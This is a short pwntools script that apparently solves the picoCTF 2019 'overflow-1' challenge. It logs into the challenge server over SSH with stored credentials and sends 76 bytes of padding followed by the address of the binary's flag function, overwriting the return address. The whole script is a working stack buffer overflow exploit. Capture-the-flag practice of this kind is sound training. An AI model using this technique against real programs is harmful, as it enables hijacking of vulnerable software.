from pwn import *
import json

LOCAL = False
CYCLIC_FOUND = True
elf = ELF('./vuln')

local_bin = "./vuln"

if(LOCAL):
    p = process(local_bin)
else:
    hostname = "2019shell1.picoctf.com"
    dir = '/problems/overflow-1_3_f08d494c74b95dae41bff71c2a6cf389'
    with open("/.creds.json") as f:
        creds = json.load(f)
        print(creds["user"],creds["pass"])
    s = ssh(host=hostname,user=creds["user"],password=creds["pass"])
    s.set_working_directory(dir)
    p = s.process('sh')
    p.sendline('./vuln')

# found offset at 76
if(not CYCLIC_FOUND):
    payload = cyclic(100)
    print(p.recvline().decode())
    p.sendline(payload)
    print(p.recvall().decode())

add_flag = elf.symbols['flag']

payload = "A"*76
payload += p32(add_flag)

print p.recvline()
p.sendline(payload)
print p.recv()
